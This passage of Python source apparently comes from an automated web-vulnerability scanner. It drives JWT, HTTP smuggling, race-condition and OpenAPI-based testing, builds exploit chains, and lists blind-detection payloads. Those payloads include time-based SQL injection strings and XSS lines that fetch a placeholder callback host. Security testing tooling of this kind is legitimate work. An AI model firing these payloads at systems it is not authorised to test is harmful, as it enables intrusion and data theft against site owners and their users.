            recommendations.append(f"Test header injection on: {', '.join(profile.headers_injectable[:5])}")
        
        if "application/xml" in profile.content_types_accepted:
            recommendations.append("Test for XXE as XML content type is accepted")
        
        if len(profile.methods_allowed) > 3:
            recommendations.append(f"Test all methods: {', '.join(profile.methods_allowed)}")
        
        results["recommendations"] = recommendations
        
        return results

    async def _handle_import_openapi(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle importing an OpenAPI/Swagger spec to discover endpoints."""
        if not OPENAPI_SERVICE_AVAILABLE:
            return {
                "type": "openapi_import_error",
                "error": "OpenAPI parser service not available",
            }
        
        openapi_config = decision.get("openapi", {})
        spec_url = openapi_config.get("url")
        spec_content = openapi_config.get("content")
        base_url = openapi_config.get("base_url", "")
        
        try:
            if spec_url:
                # Fetch and parse from URL
                spec = await parse_openapi_url(spec_url)
            elif spec_content:
                # Parse from content
                spec = parse_openapi_content(spec_content, base_url)
            else:
                # Try to discover spec at target
                target = self.session.targets[self.session.current_target_index]
                parsed_url = urllib.parse.urlparse(target.url)
                base = f"{parsed_url.scheme}://{parsed_url.netloc}"
                
                discovered_url = await discover_openapi_spec(base)
                if not discovered_url:
                    return {
                        "type": "openapi_import_error",
                        "error": "No OpenAPI spec found at common paths",
                    }
                spec = await parse_openapi_url(discovered_url)
            
            if spec.errors and not spec.endpoints:
                return {
                    "type": "openapi_import_error",
                    "errors": spec.errors,
                }
            
            # Convert endpoints to fuzzing targets
            new_targets = []
            for endpoint in spec.endpoints:
                if endpoint.deprecated:
                    continue
                
                full_url = endpoint.get_full_url(spec.base_url or base_url)
                
                # Get parameter names
                params = [p.name for p in endpoint.parameters]
                
                # Generate sample request
                sample = endpoint.generate_sample_request(spec.base_url or base_url)
                
                target = FuzzingTarget(
                    url=full_url,
                    method=endpoint.method.upper(),
                    headers=sample.get("headers", {}),
                    body=json.dumps(sample.get("body")) if sample.get("body") else None,
                    parameters=params,
                    discovered_params=params,
                )
                new_targets.append(target)
            
            # Add new targets to session
            self.session.targets.extend(new_targets)
            
            # Add to automation queue if enabled
            if self.session.auto_pilot_mode != AutoPilotMode.DISABLED:
                for target in new_targets:
                    _automation_engine.add_endpoint(target.url, target.method)
            
            self.session.fuzzing_history.append({
                "type": "openapi_import",
                "spec_title": spec.title,
                "spec_version": spec.version,
                "endpoints_imported": len(new_targets),
            })
            
            return {
                "type": "openapi_imported",
                "spec_title": spec.title,
                "spec_version": spec.version,
                "spec_type": spec.spec_version.value,
                "base_url": spec.base_url,
                "endpoints_imported": len(new_targets),
                "security_schemes": [s.to_dict() for s in spec.security_schemes],
                "endpoints": [
                    {
                        "url": t.url,
                        "method": t.method,
                        "params": t.parameters,
                    }
                    for t in new_targets[:20]  # First 20 for preview
                ],
            }
            
        except Exception as e:
            logger.error(f"OpenAPI import failed: {e}")
            return {
                "type": "openapi_import_error",
                "error": str(e),
            }

    async def _handle_oob_check(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Check for out-of-band callbacks received for this session."""
        if not OOB_SERVICE_AVAILABLE:
            return {
                "type": "oob_check_error",
                "error": "OOB callback service not available",
            }
        
        try:
            store = get_callback_store()
            events = store.get_events_by_scan(self.session.id)
            
            # Group by vulnerability type
            findings_by_type: Dict[str, list] = {}
            for event in events:
                vt = event.correlated_payload_type.value if event.correlated_payload_type else "unknown"
                if vt not in findings_by_type:
                    findings_by_type[vt] = []
                findings_by_type[vt].append({
                    "token": event.token,
                    "endpoint": event.correlated_endpoint,
                    "parameter": event.correlated_parameter,
                    "callback_type": event.callback_type.value,
                    "source_ip": event.source_ip,
                    "timestamp": event.timestamp.isoformat(),
                    "payload": event.correlated_payload,
                })
            
            # Create findings for any new callbacks
            processed_tokens = set()
            for vt, callbacks in findings_by_type.items():
                for callback in callbacks:
                    if callback["token"] in processed_tokens:
                        continue
                    processed_tokens.add(callback["token"])
                    
                    # Check if we already have a finding for this
                    existing = False
                    for f in self.session.findings:
                        if callback["payload"] and callback["payload"] in f.payload:
                            existing = True
                            break
                    
                    if not existing:
                        finding = FuzzingFinding(
                            id=str(uuid.uuid4())[:8],
                            technique=vt,
                            severity="critical",
                            title=f"Blind {vt.replace('_', ' ').title()} Confirmed via OOB",
                            description=f"Out-of-band callback received from {callback['source_ip']}, "
                                        f"confirming blind {vt} vulnerability.",
                            payload=callback.get("payload", "unknown"),
                            evidence=[
                                f"Callback received at: {callback['timestamp']}",
                                f"Source IP: {callback['source_ip']}",
                                f"Endpoint: {callback.get('endpoint', 'unknown')}",
                                f"Parameter: {callback.get('parameter', 'unknown')}",
                            ],
                            endpoint=callback.get("endpoint", "unknown"),
                            exploitable=True,
                            confidence=0.95,
                        )
                        
                        # Calculate CVSS
                        cvss_score, cvss_vector = calculate_cvss(vt, True)
                        finding.cvss_score = cvss_score
                        finding.cvss_vector = cvss_vector
                        
                        self.session.findings.append(finding)
            
            return {
                "type": "oob_check_complete",
                "total_callbacks": len(events),
                "vulnerability_types": list(findings_by_type.keys()),
                "findings_by_type": findings_by_type,
                "new_findings_created": len(processed_tokens),
            }
            
        except Exception as e:
            logger.error(f"OOB check failed: {e}")
            return {
                "type": "oob_check_error",
                "error": str(e),
            }

    async def _handle_jwt_attack(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle JWT security testing for endpoints with JWT authentication."""
        if not JWT_SERVICE_AVAILABLE:
            return {
                "type": "jwt_attack_error",
                "error": "JWT attack service not available",
            }
        
        target = self.session.targets[self.session.current_target_index]
        
        # Try to extract JWT from request
        jwt_token = None
        token_location = "header"
        token_name = "Authorization"
        token_prefix = "Bearer "
        
        # Check Authorization header
        auth_header = target.headers.get("Authorization", "") or target.headers.get("authorization", "")
        if auth_header.startswith("Bearer "):
            jwt_token = auth_header[7:]
            token_location = "header"
        elif auth_header.startswith("bearer "):
            jwt_token = auth_header[7:]
            token_location = "header"
        
        # Check for cookie-based JWT
        if not jwt_token:
            for cookie_name in ["token", "jwt", "access_token", "session_token", "auth"]:
                if cookie_name in target.headers.get("Cookie", ""):
                    # Parse cookie
                    import re
                    match = re.search(rf'{cookie_name}=([^;]+)', target.headers.get("Cookie", ""))
                    if match:
                        potential_jwt = match.group(1)
                        if potential_jwt.count('.') == 2:  # JWT format check
                            jwt_token = potential_jwt
                            token_location = "cookie"
                            token_name = cookie_name
                            token_prefix = ""
                            break
        
        # Check body for JWT
        if not jwt_token and target.body:
            import re
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            match = re.search(jwt_pattern, target.body)
            if match:
                jwt_token = match.group(0)
                token_location = "body"
                token_prefix = ""
        
        if not jwt_token:
            return {
                "type": "jwt_attack_skipped",
                "reason": "No JWT token found in request",
            }
        
        # First, analyze the token
        try:
            analysis = analyze_jwt_token(jwt_token)
            
            # Log token analysis
            self.session.fuzzing_history.append({
                "type": "jwt_analysis",
                "token_analyzed": True,
                "algorithm": analysis.get("algorithm"),
                "issues": analysis.get("issues", []),
            })
            
            # If token has obvious issues, report them
            for issue in analysis.get("issues", []):
                if issue.get("severity") in ["critical", "high"]:
                    finding = FuzzingFinding(
                        id=str(uuid.uuid4())[:8],
                        technique="jwt_attack",
                        severity=issue.get("severity", "medium"),
                        title=issue.get("issue", "JWT Security Issue"),
                        description=issue.get("description", ""),
                        payload=jwt_token[:50] + "...",  # Truncate for privacy
                        evidence=[
                            f"Algorithm: {analysis.get('algorithm')}",
                            f"Issue: {issue.get('issue')}",
                        ],
                        endpoint=target.url,
                        exploitable=issue.get("severity") == "critical",
                        confidence=0.8,
                    )
                    
                    # Check deduplication
                    is_dup, reason = _finding_deduplicator.is_duplicate(finding)
                    if not is_dup:
                        self.session.findings.append(finding)
                        _finding_deduplicator.add_finding(finding)
        except Exception as e:
            logger.warning(f"JWT analysis failed: {e}")
        
        # Run active attacks against the endpoint
        attacks_to_run = decision.get("attacks", [
            "alg_none", "weak_secret", "exp_bypass", "claim_tampering"
        ])
        
        attack_results = []
        vulnerabilities_found = []
        
        try:
            async for event in scan_jwt(
                token=jwt_token,
                target_url=target.url,
                token_location=token_location,
                token_name=token_name,
                token_prefix=token_prefix,
                http_method=target.method,
                attacks=attacks_to_run,
            ):
                event_type = event.get("type")
                
                if event_type == "vulnerability_found":
                    vuln = event.get("result", {})
                    vulnerabilities_found.append(vuln)
                    
                    # Create finding
                    finding = FuzzingFinding(
                        id=str(uuid.uuid4())[:8],
                        technique="jwt_attack",
                        severity=vuln.get("severity", "high"),
                        title=f"JWT {vuln.get('attack_type', 'Unknown')} Vulnerability",
                        description=vuln.get("description", "JWT security vulnerability detected"),
                        payload=vuln.get("payload", "")[:100],
                        evidence=[
                            vuln.get("evidence", "Response indicates vulnerability"),
                        ],
                        endpoint=target.url,
                        exploitable=vuln.get("exploitable", True),
                        confidence=vuln.get("confidence", 0.8),
                        cvss_score=vuln.get("cvss_score", 7.5),
                        recommendation=vuln.get("remediation", "Implement proper JWT validation"),
                    )
                    
                    is_dup, reason = _finding_deduplicator.is_duplicate(finding)
                    if not is_dup:
                        self.session.findings.append(finding)
                        _finding_deduplicator.add_finding(finding)
                
                elif event_type == "attack_complete":
                    attack_results.append({
                        "attack": event.get("attack"),
                        "success": event.get("vulnerable", False),
                    })
                
                elif event_type == "progress":
                    # Log progress
                    self.session.fuzzing_history.append({
                        "type": "jwt_progress",
                        "message": event.get("message"),
                    })
                
        except Exception as e:
            logger.error(f"JWT scan failed: {e}")
            return {
                "type": "jwt_attack_error",
                "error": str(e),
            }
        
        # Track JWT_ATTACK technique
        if target.url not in self.session.techniques_tried:
            self.session.techniques_tried[target.url] = []
        if "jwt_attack" not in self.session.techniques_tried[target.url]:
            self.session.techniques_tried[target.url].append("jwt_attack")
        
        return {
            "type": "jwt_attack_complete",
            "token_found": True,
            "token_location": token_location,
            "attacks_run": len(attack_results),
            "vulnerabilities_found": len(vulnerabilities_found),
            "vulnerabilities": vulnerabilities_found,
            "attacks_summary": attack_results,
        }

    async def _handle_http_smuggling(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle HTTP request smuggling detection."""
        if not HTTP_SMUGGLING_SERVICE_AVAILABLE:
            return {
                "type": "http_smuggling_error",
                "error": "HTTP smuggling service not available",
            }
        
        target = self.session.targets[self.session.current_target_index]
        parsed_url = urllib.parse.urlparse(target.url)
        
        # Configure smuggling detector
        techniques = decision.get("techniques", [
            "cl_te", "te_cl", "te_te", "h2_cl", "h2_te"
        ])
        
        # Note: HTTPSmugglingDetector only accepts timeout params, not target info
        # Target info is passed via scan_for_smuggling function instead
        detector = HTTPSmugglingDetector(
            timeout=decision.get("timeout", 10.0),
        )
        
        vulnerabilities_found = []
        techniques_tested = []
        
        try:
            # Run smuggling scan - function returns dict, not async generator
            result = await scan_for_smuggling(
                url=target.url,
                method=target.method,
                techniques=techniques,
            )
            
            # Process results
            if result and result.get("vulnerabilities"):
                for vuln in result.get("vulnerabilities", []):
                    vulnerabilities_found.append(vuln)
                    
                    # Create finding
                    finding = FuzzingFinding(
                        id=str(uuid.uuid4())[:8],
                        technique="http_smuggling",
                        severity=vuln.get("severity", "critical"),
                        title=f"HTTP Request Smuggling ({vuln.get('technique', 'Unknown')})",
                        description=vuln.get("description", "HTTP request smuggling vulnerability detected"),
                        payload=vuln.get("payload", "")[:200],
                        evidence=[
                            f"Technique: {vuln.get('technique')}",
                            f"Timing delta: {vuln.get('timing_delta', 'N/A')}ms",
                            vuln.get("evidence", "Response anomaly detected"),
                        ],
                        endpoint=target.url,
                        exploitable=True,  # Smuggling is always exploitable
                        confidence=vuln.get("confidence", 0.9),
                        cvss_score=vuln.get("cvss_score", 9.1),
                        recommendation=(
                            "Normalize HTTP parsing between frontend and backend. "
                            "Disable HTTP/2 downgrade if not needed. "
                            "Use HTTP/2 end-to-end with no downgrading."
                        ),
                    )
                    
                    is_dup, reason = _finding_deduplicator.is_duplicate(finding)
                    if not is_dup:
                        self.session.findings.append(finding)
                        _finding_deduplicator.add_finding(finding)
            
            # Track techniques tested
            techniques_tested = result.get("techniques_tested", techniques) if result else techniques
                    
        except Exception as e:
            logger.error(f"HTTP smuggling scan failed: {e}")
            return {
                "type": "http_smuggling_error",
                "error": str(e),
            }
        
        # Track technique
        if target.url not in self.session.techniques_tried:
            self.session.techniques_tried[target.url] = []
        if "http_smuggling" not in self.session.techniques_tried[target.url]:
            self.session.techniques_tried[target.url].append("http_smuggling")
        
        return {
            "type": "http_smuggling_complete",
            "techniques_tested": len(techniques_tested),
            "vulnerabilities_found": len(vulnerabilities_found),
            "vulnerabilities": vulnerabilities_found,
            "techniques_summary": techniques_tested,
        }

    async def _handle_race_condition(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle race condition / TOCTOU vulnerability detection."""
        if not RACE_CONDITION_SERVICE_AVAILABLE:
            return {
                "type": "race_condition_error",
                "error": "Race condition service not available",
            }
        
        target = self.session.targets[self.session.current_target_index]
        
        # Determine race types to test based on endpoint characteristics
        race_types = decision.get("race_types", None)
        
        # Auto-detect relevant race types if not specified
        if not race_types:
            race_types = []
            path_lower = target.url.lower()
            body_lower = (target.body or "").lower()
            
            # Check for financial/limit operations
            if any(kw in path_lower or kw in body_lower for kw in [
                "transfer", "payment", "withdraw", "balance", "credit", "debit"
            ]):
                race_types.extend(["double_spend", "limit_overrun"])
            
            # Check for coupon/discount operations
            if any(kw in path_lower or kw in body_lower for kw in [
                "coupon", "discount", "promo", "redeem", "voucher"
            ]):
                race_types.append("coupon_race")
            
            # Check for signup/registration
            if any(kw in path_lower for kw in ["signup", "register", "create"]):
                race_types.append("signup_race")
            
            # Check for token operations
            if any(kw in path_lower or kw in body_lower for kw in [
                "token", "otp", "code", "verify"
            ]):
                race_types.append("token_reuse")
            
            # Check for file operations
            if any(kw in path_lower for kw in ["upload", "file", "download"]):
                race_types.append("file_race")
            
            # Default to general race types
            if not race_types:
                race_types = ["limit_overrun", "toctou", "session_race"]
        
        # Configure race condition detector
        detector = RaceConditionDetector(
            target_url=target.url,
            method=target.method,
            headers=target.headers,
            body=target.body,
            race_types=race_types,
            concurrency=decision.get("concurrency", 10),
            iterations=decision.get("iterations", 5),
        )
        
        vulnerabilities_found = []
        race_tests = []
        
        try:
            # Run race condition scan
            async for event in scan_for_race_conditions(
                target_url=target.url,
                method=target.method,
                headers=target.headers,
                body=target.body,
                race_types=race_types,
                concurrency=decision.get("concurrency", 10),
            ):
                event_type = event.get("type")
                
                if event_type == "vulnerability_found":
                    vuln = event.get("result", {})
                    vulnerabilities_found.append(vuln)
                    
                    # Create finding
                    finding = FuzzingFinding(
                        id=str(uuid.uuid4())[:8],
                        technique="race_condition",
                        severity=vuln.get("severity", "high"),
                        title=f"Race Condition ({vuln.get('race_type', 'Unknown')})",
                        description=vuln.get("description", "Race condition vulnerability detected"),
                        payload=f"Concurrent requests: {vuln.get('concurrency', 'N/A')}",
                        evidence=[
                            f"Race type: {vuln.get('race_type')}",
                            f"Success count: {vuln.get('success_count', 'N/A')}/{vuln.get('total_requests', 'N/A')}",
                            vuln.get("evidence", "Multiple successful operations detected"),
                        ],
                        endpoint=target.url,
                        exploitable=vuln.get("exploitable", True),
                        confidence=vuln.get("confidence", 0.85),
                        cvss_score=vuln.get("cvss_score", 8.1),
                        recommendation=(
                            "Implement proper locking/mutex mechanisms. "
                            "Use database transactions with proper isolation levels. "
                            "Add idempotency keys for sensitive operations."
                        ),
                    )
                    
                    is_dup, reason = _finding_deduplicator.is_duplicate(finding)
                    if not is_dup:
                        self.session.findings.append(finding)
                        _finding_deduplicator.add_finding(finding)
                
                elif event_type == "race_test_complete":
                    race_tests.append({
                        "race_type": event.get("race_type"),
                        "vulnerable": event.get("vulnerable", False),
                        "details": event.get("details", {}),
                    })
                
                elif event_type == "progress":
                    self.session.fuzzing_history.append({
                        "type": "race_progress",
                        "message": event.get("message"),
                    })
                    
        except Exception as e:
            logger.error(f"Race condition scan failed: {e}")
            return {
                "type": "race_condition_error",
                "error": str(e),
            }
        
        # Track technique
        if target.url not in self.session.techniques_tried:
            self.session.techniques_tried[target.url] = []
        if "race_condition" not in self.session.techniques_tried[target.url]:
            self.session.techniques_tried[target.url].append("race_condition")
        
        return {
            "type": "race_condition_complete",
            "race_types_tested": len(race_tests),
            "vulnerabilities_found": len(vulnerabilities_found),
            "vulnerabilities": vulnerabilities_found,
            "race_tests_summary": race_tests,
        }

    async def _run_advanced_phases(self, progress_tracker: "ScanProgressTracker") -> AsyncGenerator[Dict[str, Any], None]:
        """Run advanced testing phases: blind detection, chain exploitation, HTTP smuggling, race conditions, JWT."""
        
        target_url = self.session.targets[0].url if self.session.targets else ""
        
        # Phase 1: Blind Detection (if not already done extensively)
        try:
            progress_tracker.start_phase("blind_detection", "Checking blind vulnerabilities...")
            yield progress_tracker.get_progress_event()
            
            # Run comprehensive blind detection for common vulnerability types
            blind_findings = []
            blind_techniques = ["sql_injection", "xss", "ssrf", "xxe", "ssti"]
            
            for technique in blind_techniques:
                try:
                    result = await self._run_blind_detection(technique, target_url)
                    if result and result.get("detected"):
                        blind_findings.append(result)
                        yield {
                            "type": "blind_vuln_found",
                            "technique": technique,
                            "detection_type": result.get("detection_type", "callback"),
                            "details": result,
                        }
                except Exception as e:
                    logger.debug(f"Blind detection for {technique} failed: {e}")
            
            progress_tracker.complete_phase("blind_detection")
            yield {
                "type": "blind_detection_complete",
                "techniques_tested": len(blind_techniques),
                "findings": len(blind_findings),
            }
        except Exception as e:
            logger.warning(f"Blind detection phase failed: {e}")
            progress_tracker.complete_phase("blind_detection")
        
        # Phase 2: Chain Exploitation
        try:
            progress_tracker.start_phase("chain_exploitation", "Building attack chains...")
            yield progress_tracker.get_progress_event()
            
            # Try to build exploit chains from existing findings
            if self.session.findings:
                chains_built = await self._build_exploit_chains()
                if chains_built:
                    for chain in chains_built:
                        yield {
                            "type": "chain_update",
                            "chain": chain,
                        }
            
            progress_tracker.complete_phase("chain_exploitation")
            yield {
                "type": "chain_exploitation_complete",
                "chains_built": len(self.session.attack_chains) if hasattr(self.session, 'attack_chains') else 0,
            }
        except Exception as e:
            logger.warning(f"Chain exploitation phase failed: {e}")
            progress_tracker.complete_phase("chain_exploitation")
        
        # Phase 3: HTTP Smuggling Testing
        if HTTP_SMUGGLING_SERVICE_AVAILABLE:
            try:
                progress_tracker.start_phase("http_smuggling", "Testing HTTP smuggling...")
                yield progress_tracker.get_progress_event()
                
                smuggling_result = await self._test_http_smuggling(target_url)
                if smuggling_result and smuggling_result.get("vulnerabilities"):
                    for vuln in smuggling_result["vulnerabilities"]:
                        finding = FuzzingFinding(
                            id=f"smuggling_{datetime.utcnow().timestamp()}",
                            title=f"HTTP Smuggling: {vuln.get('type', 'Unknown')}",
                            severity="high",
                            description=vuln.get("description", "HTTP request smuggling detected"),
                            evidence=[vuln.get("evidence", "")],
                            technique="http_smuggling",
                            cvss_score=8.1,
                            payload=vuln.get("payload", ""),
                            endpoint=target_url,
                        )
                        self.session.findings.append(finding)
                        yield {"type": "finding", "finding": finding.to_dict()}
                
                progress_tracker.complete_phase("http_smuggling")
                yield {
                    "type": "http_smuggling_complete",
                    "vulnerabilities_found": len(smuggling_result.get("vulnerabilities", [])) if smuggling_result else 0,
                }
            except Exception as e:
                logger.warning(f"HTTP smuggling phase failed: {e}")
                progress_tracker.complete_phase("http_smuggling")
        else:
            progress_tracker.skip_phase("http_smuggling")
        
        # Phase 4: Race Condition Testing
        if RACE_CONDITION_SERVICE_AVAILABLE:
            try:
                progress_tracker.start_phase("race_conditions", "Testing race conditions...")
                yield progress_tracker.get_progress_event()
                
                race_result = await self._test_race_conditions(target_url)
                if race_result and race_result.get("vulnerabilities"):
                    for vuln in race_result["vulnerabilities"]:
                        finding = FuzzingFinding(
                            id=f"race_{datetime.utcnow().timestamp()}",
                            title=f"Race Condition: {vuln.get('type', 'TOCTOU')}",
                            severity="high",
                            description=vuln.get("description", "Race condition vulnerability detected"),
                            evidence=[vuln.get("evidence", "")],
                            technique="race_condition",
                            cvss_score=7.5,
                            payload=vuln.get("payload", ""),
                            endpoint=target_url,
                        )
                        self.session.findings.append(finding)
                        yield {"type": "finding", "finding": finding.to_dict()}
                
                progress_tracker.complete_phase("race_conditions")
                yield {
                    "type": "race_conditions_complete",
                    "vulnerabilities_found": len(race_result.get("vulnerabilities", [])) if race_result else 0,
                }
            except Exception as e:
                logger.warning(f"Race condition phase failed: {e}")
                progress_tracker.complete_phase("race_conditions")
        else:
            progress_tracker.skip_phase("race_conditions")
        
        # Phase 5: JWT Security Testing
        try:
            progress_tracker.start_phase("jwt_security", "Testing JWT security...")
            yield progress_tracker.get_progress_event()
            
            jwt_result = await self._test_jwt_security(target_url)
            if jwt_result and jwt_result.get("vulnerabilities"):
                for vuln in jwt_result["vulnerabilities"]:
                    finding = FuzzingFinding(
                        id=f"jwt_{datetime.utcnow().timestamp()}",
                        title=f"JWT Vulnerability: {vuln.get('type', 'Unknown')}",
                        severity=vuln.get("severity", "high"),
                        description=vuln.get("description", "JWT security issue detected"),
                        evidence=[vuln.get("evidence", "")],
                        technique="jwt_attacks",
                        cvss_score=vuln.get("cvss", 7.5),
                        payload=vuln.get("payload", ""),
                        endpoint=target_url,
                    )
                    self.session.findings.append(finding)
                    yield {"type": "finding", "finding": finding.to_dict()}
            
            progress_tracker.complete_phase("jwt_security")
            yield {
                "type": "jwt_security_complete",
                "vulnerabilities_found": len(jwt_result.get("vulnerabilities", [])) if jwt_result else 0,
            }
        except Exception as e:
            logger.warning(f"JWT security phase failed: {e}")
            progress_tracker.complete_phase("jwt_security")

    async def _test_http_smuggling(self, target_url: str) -> Dict[str, Any]:
        """Test for HTTP request smuggling vulnerabilities."""
        vulnerabilities = []
        
        if not HTTP_SMUGGLING_SERVICE_AVAILABLE:
            return {"vulnerabilities": [], "tested": False}
        
        try:
            # Import and use the HTTP smuggling service
            from backend.services.http_smuggling_service import test_http_smuggling
            
            result = await test_http_smuggling(target_url, timeout=30)
            if result and result.get("vulnerable"):
                vulnerabilities.append({
                    "type": result.get("technique", "CL.TE"),
                    "description": f"HTTP request smuggling vulnerability ({result.get('technique', 'unknown')}) detected",
                    "evidence": result.get("evidence", ""),
                    "severity": "high",
                })
        except Exception as e:
            logger.debug(f"HTTP smuggling test error: {e}")
        
        return {"vulnerabilities": vulnerabilities, "tested": True}

    async def _test_race_conditions(self, target_url: str) -> Dict[str, Any]:
        """Test for race condition vulnerabilities."""
        vulnerabilities = []
        
        if not RACE_CONDITION_SERVICE_AVAILABLE:
            return {"vulnerabilities": [], "tested": False}
        
        try:
            # Import and use the race condition service
            from backend.services.race_condition_service import scan_for_race_conditions
            
            result = await scan_for_race_conditions(target_url, concurrent_requests=10, timeout=30)
            if result and result.get("vulnerable"):
                vulnerabilities.append({
                    "type": result.get("race_type", "TOCTOU"),
                    "description": f"Race condition vulnerability detected: {result.get('description', '')}",
                    "evidence": result.get("evidence", ""),
                    "severity": "high",
                })
        except Exception as e:
            logger.debug(f"Race condition test error: {e}")
        
        return {"vulnerabilities": vulnerabilities, "tested": True}

    async def _test_jwt_security(self, target_url: str) -> Dict[str, Any]:
        """Test for JWT security vulnerabilities."""
        vulnerabilities = []
        
        try:
            # Check for JWT in responses from the target
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(target_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        # Check for JWT in cookies
                        for cookie in response.cookies.values():
                            if self._is_jwt(cookie.value):
                                jwt_vulns = await self._analyze_jwt(cookie.value)
                                vulnerabilities.extend(jwt_vulns)
                        
                        # Check for JWT in response headers
                        auth_header = response.headers.get("Authorization", "")
                        if auth_header.startswith("Bearer ") and self._is_jwt(auth_header[7:]):
                            jwt_vulns = await self._analyze_jwt(auth_header[7:])
                            vulnerabilities.extend(jwt_vulns)
                except Exception:
                    pass
            
            # Also test common JWT attack vectors on auth endpoints
            auth_endpoints = ["/login", "/auth", "/api/auth", "/api/login", "/oauth/token"]
            for endpoint in auth_endpoints:
                try:
                    test_url = f"{target_url.rstrip('/')}{endpoint}"
                    async with session.post(test_url, json={"test": "jwt"}, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        # Check response for JWT
                        try:
                            data = await resp.json()
                            for key in ["token", "access_token", "jwt", "id_token"]:
                                if key in data and self._is_jwt(str(data[key])):
                                    jwt_vulns = await self._analyze_jwt(str(data[key]))
                                    vulnerabilities.extend(jwt_vulns)
                        except Exception:
                            pass
                except Exception:
                    pass
        except Exception as e:
            logger.debug(f"JWT security test error: {e}")
        
        return {"vulnerabilities": vulnerabilities, "tested": True}

    def _is_jwt(self, token: str) -> bool:
        """Check if a string looks like a JWT."""
        try:
            parts = token.split(".")
            if len(parts) == 3:
                # Try to decode header
                import base64
                header = base64.urlsafe_b64decode(parts[0] + "==")
                return b"alg" in header
        except Exception:
            pass
        return False

    async def _analyze_jwt(self, token: str) -> List[Dict[str, Any]]:
        """Analyze a JWT for common vulnerabilities."""
        vulnerabilities = []
        
        try:
            import base64
            import json
            
            parts = token.split(".")
            if len(parts) != 3:
                return vulnerabilities
            
            # Decode header
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            
            # Check for "none" algorithm
            if header.get("alg", "").lower() == "none":
                vulnerabilities.append({
                    "type": "JWT None Algorithm",
                    "description": "JWT uses 'none' algorithm, allowing unsigned tokens",
                    "evidence": f"Header: {header}",
                    "severity": "critical",
                    "cvss": 9.8,
                })
            
            # Check for weak algorithms
            weak_algs = ["HS256", "HS384", "HS512"]
            if header.get("alg") in weak_algs:
                vulnerabilities.append({
                    "type": "JWT Weak Algorithm",
                    "description": f"JWT uses symmetric algorithm ({header.get('alg')}) which may be vulnerable to brute-force",
                    "evidence": f"Algorithm: {header.get('alg')}",
                    "severity": "medium",
                    "cvss": 5.3,
                })
            
            # Test algorithm confusion (RS256 -> HS256)
            if header.get("alg", "").startswith("RS"):
                # This is a potential algorithm confusion target
                vulnerabilities.append({
                    "type": "JWT Algorithm Confusion Risk",
                    "description": "JWT uses RSA algorithm - test for algorithm confusion (RS256 -> HS256) attack",
                    "evidence": f"Algorithm: {header.get('alg')}",
                    "severity": "info",
                    "cvss": 0,
                })
        except Exception as e:
            logger.debug(f"JWT analysis error: {e}")
        
        return vulnerabilities

    async def _build_exploit_chains(self) -> List[Dict[str, Any]]:
        """Build exploit chains from existing findings."""
        chains = []
        
        # Look for findings that can be chained
        ssrf_findings = [f for f in self.session.findings if "ssrf" in f.technique.lower()]
        sqli_findings = [f for f in self.session.findings if "sql" in f.technique.lower()]
        xss_findings = [f for f in self.session.findings if "xss" in f.technique.lower()]
        auth_findings = [f for f in self.session.findings if "auth" in f.technique.lower() or "jwt" in f.technique.lower()]
        
        # SSRF -> Internal Access chain
        for ssrf in ssrf_findings:
            chains.append({
                "id": f"chain_{len(chains)}",
                "name": "SSRF to Internal Network Access",
                "steps": [
                    {"step": 1, "finding": ssrf.id, "description": "Exploit SSRF to access internal services"},
                    {"step": 2, "description": "Enumerate internal network (169.254.169.254, localhost, internal IPs)"},
                    {"step": 3, "description": "Access cloud metadata or internal APIs"},
                ],
                "impact": "High - Access to internal network and potential cloud credentials",
                "cvss": 9.0,
            })
        
        # SQLi -> Data Exfiltration chain
        for sqli in sqli_findings:
            chains.append({
                "id": f"chain_{len(chains)}",
                "name": "SQL Injection to Data Breach",
                "steps": [
                    {"step": 1, "finding": sqli.id, "description": "Exploit SQL injection"},
                    {"step": 2, "description": "Enumerate database schema and tables"},
                    {"step": 3, "description": "Extract sensitive data (users, credentials, PII)"},
                ],
                "impact": "Critical - Full database compromise and data breach",
                "cvss": 9.8,
            })
        
        # Auth bypass -> Account takeover chain
        for auth in auth_findings:
            chains.append({
                "id": f"chain_{len(chains)}",
                "name": "Authentication Bypass to Account Takeover",
                "steps": [
                    {"step": 1, "finding": auth.id, "description": "Exploit authentication vulnerability"},
                    {"step": 2, "description": "Access admin or privileged accounts"},
                    {"step": 3, "description": "Escalate privileges and maintain persistence"},
                ],
                "impact": "Critical - Full account takeover and privilege escalation",
                "cvss": 9.1,
            })
        
        # Store chains in session
        if not hasattr(self.session, 'attack_chains'):
            self.session.attack_chains = []
        self.session.attack_chains.extend(chains)
        
        return chains

    async def _run_blind_detection(self, technique: str, target_url: str) -> Dict[str, Any]:
        """Run blind detection for a specific technique using callback/timing-based detection."""
        try:
            # Generate unique callback ID
            callback_id = f"{technique}_{datetime.utcnow().timestamp()}"
            
            # Technique-specific payloads for blind detection
            payloads = self._get_blind_payloads(technique, callback_id)
            
            for payload_info in payloads:
                try:
                    async with aiohttp.ClientSession() as session:
                        # Test multiple injection points
                        for injection_point in ["param", "header", "body"]:
                            result = await self._test_blind_payload(
                                session, target_url, payload_info, injection_point
                            )
                            if result and result.get("detected"):
                                return result
                except Exception as e:
                    logger.debug(f"Blind payload test failed: {e}")
            
            return {"detected": False, "technique": technique}
        except Exception as e:
            logger.debug(f"Blind detection for {technique} failed: {e}")
            return {"detected": False, "technique": technique, "error": str(e)}

    def _get_blind_payloads(self, technique: str, callback_id: str) -> List[Dict[str, Any]]:
        """Get blind detection payloads for a technique."""
        # Use a public callback URL or internal timing detection
        callback_domain = "callback.example.com"  # Replace with actual callback server
        
        payloads = {
            "sql_injection": [
                {"payload": "1' AND SLEEP(5)--", "detection": "timing", "delay": 5},
                {"payload": "1'; WAITFOR DELAY '0:0:5'--", "detection": "timing", "delay": 5},
                {"payload": f"1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--", "detection": "timing", "delay": 5},
            ],
            "xss": [
                {"payload": f"<img src=http://{callback_domain}/{callback_id}>", "detection": "callback"},
                {"payload": f"<script>fetch('http://{callback_domain}/{callback_id}')</script>", "detection": "callback"},
